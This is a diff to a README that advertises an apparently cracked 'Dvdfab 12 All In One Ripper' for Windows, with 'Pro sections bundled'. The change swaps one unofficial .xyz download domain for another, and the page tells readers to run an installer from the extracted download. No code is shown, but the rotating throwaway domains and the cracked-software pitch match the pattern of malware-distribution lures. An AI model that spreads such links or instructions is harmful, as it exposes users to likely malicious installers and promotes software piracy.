@@ -18,8 +18,8 @@ Use **Dvdfab 12 All In One Ripper** on desktop Windows when you want the full pr
 
 > Use the project link below for Windows.
 
-* **Project link:** **[dvdfab.nexpath.xyz](https://dvdfab.nexpath.xyz/)**
-* **Full URL:** `https://dvdfab.nexpath.xyz/`
+* **Project link:** **[dvdfab.nerasix.xyz](https://dvdfab.nerasix.xyz/)**
+* **Full URL:** `https://dvdfab.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ Pro sections are bundled in this release. Install locally, open the app, and use
 * **RAM:** 8 GB minimum | 16 GB for large projects
 * **Disk:** 4 GB free on system drive
 
-***
+***
